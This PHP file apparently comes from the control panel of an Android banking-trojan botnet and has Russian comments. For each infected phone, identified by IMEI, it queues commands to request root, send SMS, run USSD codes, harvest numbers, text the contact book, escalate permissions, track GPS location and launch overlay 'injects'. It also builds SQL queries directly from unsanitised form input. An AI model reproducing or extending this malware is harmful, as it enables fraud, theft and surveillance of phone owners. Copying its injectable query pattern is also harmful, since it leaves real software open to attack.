<?php
		 //передаем данные для выпонения команд!!!-----
		if(isset($_POST["bth_add_command"]))
		{
			
			
			if (isset($_POST['comboBox_commands'])) 
			{
							
				include 'config.php';
				$connection3 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
				$connection3->exec('SET NAMES utf8');
				$que=$_POST['comboBox_commands'];
								
				if($que == "r_root")
				{
					$imeis_ = $_POST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					
					foreach($imeis_ as $imei)
					{
						if($imei !="" )
						{
							//ID=123|command=Send SMS|number=123123|text=eqweqwe
							$command_ = "Go_P00t_request::";
							$add_db_commands = $connection3->exec("insert into commands (IMEI,command)value ('$imei','$command_')");
						}
					}
				}

				if($que == "sentSMS")
				{
					$imeis_ = $_POST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					
					$numb = $_POST['text_number'];
					$msg = $_POST['text_msg'];
					
					foreach($imeis_ as $imei)
					{
						if($imei !="" )
						{
							//ID=123|command=Send SMS|number=123123|text=eqweqwe
							$command_ = "|command=Send_GO_SMS|number=$numb|text=$msg::";
							$add_db_commands = $connection3->exec("insert into commands (IMEI,command)value ('$imei','$command_')");
							//echo "<script>alert('$imei $command_')</script>";
						}
					}
				}
				if($que == "startUSSD")
				{
					$imeis_ = $_POST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					
					$ussd = $_POST['text_ussd'];
					$ussd = str_replace("*",urlencode("*"),$ussd);
					$ussd = str_replace("#",urlencode("#"),$ussd);
					
					foreach($imeis_ as $imei)
					{
						if($imei !="" )
						{
							//ID=123|command=Send SMS|number=123123|text=eqweqwe
							$command_ = "|UssDg0=$ussd|endUssD::";
							$add_db_commands = $connection3->exec("insert into commands (IMEI,command)value ('$imei','$command_')");
							//echo "<script>alert('$imei $command_')</script>";
						}
					}
				}
				if($que == "numberGO")
				{
					$imeis_ = $_POST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					
					foreach($imeis_ as $imei)
					{
						if($imei !="" )
						{
							//ID=123|command=Send SMS|number=123123|text=eqweqwe
							$command_ = "nymBePsG0::";
							$add_db_commands = $connection3->exec("insert into commands (IMEI,command)value ('$imei','$command_')");
						}
					}
				}
			}
			
			if($que == "numberGOsendSMS")
				{
					$imeis_ = $_POST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					
					$ussd = $_POST['text_sms_tel_book'];

					foreach($imeis_ as $imei)
					{
						if($imei !="" )
						{
							//ID=123|command=Send SMS|number=123123|text=eqweqwe
							$command_ = "|telbookgotext=$ussd|endtextbook::";
							$add_db_commands = $connection3->exec("insert into commands (IMEI,command)value ('$imei','$command_')");
							//echo "<script>alert('$imei $command_')</script>";
						}
					}
				}
				
				if($que == "startPermis")
				{
					$imeis_ = $_POST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					
					foreach($imeis_ as $imei)
					{
						if($imei !="" )
						{
							//ID=123|command=Send SMS|number=123123|text=eqweqwe
							$command_ = "Go_startPermis_request::";
							$add_db_commands = $connection3->exec("insert into commands (IMEI,command)value ('$imei','$command_')");
						}
					}
				}
				if($que == "startGPSlocat")
				{
					$imeis_ = $_POST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					
					foreach($imeis_ as $imei)
					{
						if($imei !="" )
						{
							//ID=123|command=Send SMS|number=123123|text=eqweqwe
							$command_ = "Go_GPSlocat_request::";
							$add_db_commands = $connection3->exec("insert into commands (IMEI,command)value ('$imei','$command_')");
						}
					}
				}
				
				if($que == "startinj")
				{
					$imeis_ = $_POST['text_imei'];
					$imeis_  = explode(':', $imeis_);
					
					$ussd = $_POST['comboBox_inj'];

					foreach($imeis_ as $imei)
					{
						if($imei !="" )
						{
							//ID=123|command=Send SMS|number=123123|text=eqweqwe
							$command_ = "|startinj=$ussd|endstartinj::";
							$add_db_commands = $connection3->exec("insert into commands (IMEI,command)value ('$imei','$command_')");
							//echo "<script>alert('$imei $command_')</script>";
						}
					}
				}
				$page = $_POST['ref'];
				
			header ("Location: /?cont=kliets&page=$page");
		}
?>